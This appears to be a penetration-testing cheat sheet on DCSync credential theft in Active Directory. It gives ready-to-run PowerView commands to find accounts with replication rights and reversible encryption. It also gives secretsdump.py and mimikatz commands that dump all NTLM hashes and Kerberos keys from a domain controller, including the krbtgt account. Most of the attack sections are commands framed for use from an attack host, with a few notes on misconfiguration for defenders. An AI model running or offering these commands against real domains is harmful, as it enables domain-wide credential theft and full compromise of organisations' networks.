## Methodology

1. Verify account controls the **DS-Replication-Get-Changes-All** and **DS-Replication-Get-Changes** extended rights,.
2. Enumerate for **ENCRYPTED_TEXT_PWD_ALLOWED** to identify accounts with reversible encryption enabled,.
3. Select attack host; use `secretsdump.py` for Linux-based remote extraction or `mimikatz` for local Windows execution,.
4. Execute extraction targeting the entire NTDS database or specific high-value targets like the **krbtgt** account,.

---

## Replication Right Verification

Control of a user SID is established and you need to confirm if replication permissions are delegated to non-admin accounts,.

Get the target user SID to use in ACL filtering

```
Get-DomainUser -Identity <USERNAME> | select samaccountname,objectsid
```

Check the domain object ACLs specifically for replication rights associated with the user SID,.

```
Get-ObjectAcl "DC=<DOMAIN>,DC=LOCAL" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match '<SID>'} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

**Dangerous / misconfigured settings**

- Standard domain users granted **Replicating Directory Changes** and **Replicating Directory Changes All** permissions.
- Accounts with **WriteDacl** over a user can self-assign these rights to perform the attack.

**Gotchas** **Permissions must be set on the domain object itself** to allow full database replication.

## Remote Password Database Extraction

Replication rights are confirmed and you are operating from a Linux attack host,.

Extract all NTLM hashes and Kerberos keys from the DC and save to a file.

```
secretsdump.py -outputfile <FILE_PATH> -just-dc <DOMAIN>/<USERNAME>@<DC_IP>
```

Extract only NTLM hashes for a specific user to minimize noise.

```
secretsdump.py -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>@<DC_IP>
```

Dump NTDS data with password history and account status for auditing.

```
secretsdump.py -just-dc -history -user-status <DOMAIN>/<USERNAME>@<DC_IP>
```

**Tool comparison**

- `secretsdump.py`
    - `secretsdump.py -just-dc <DOMAIN>/<USERNAME>@<DC_IP>`
    - Prefer for remote extraction from Linux or when full NTDS dumping to disk is required,.
- `mimikatz`
    - `lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>`
    - Prefer when already positioned on a Windows host and targeting specific accounts,.

**Edge cases**

- Use `-pwd-last-set` to identify stale accounts or prioritize recently changed passwords.

## Local Windows Extraction

Direct access to a Windows attack host is available and the privileged user's context is required,.

Spawn a shell in the context of the user holding DCSync privileges if not already logged in as them.

```
runas /netonly /user:<DOMAIN>\<USERNAME> powershell
```

Execute the DCSync request for a specific target account like the built-in administrator.

```
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USERNAME>" exit
```

> ⚠️ Gap: Mimikatz requires **SeDebugPrivilege** (via `privilege::debug`) to interact with LSASS/system processes for certain operations, though DCSync itself is a network-based RPC call.

**Gotchas** **Mimikatz must run in the exact context of the user with replication rights** to authenticate the RPC request to the DC.

## Reversible Encryption Enumeration

Cleartext credentials are required or the environment is suspected of using legacy encryption for application support,.

Filter for accounts where the UserAccountControl attribute includes the **ENCRYPTED_TEXT_PWD_ALLOWED** bit,.

```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

Audit for reversible encryption using the native AD module.

```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

**Dangerous / misconfigured settings**

- **ENCRYPTED_TEXT_PWD_ALLOWED** enabled on accounts; passwords are stored with RC4 encryption and can be decrypted using the **Syskey**.

**Gotchas** **Disabling reversible encryption does not immediately secure the hash**; the user must change their password after the setting is disabled to move to one-way encryption.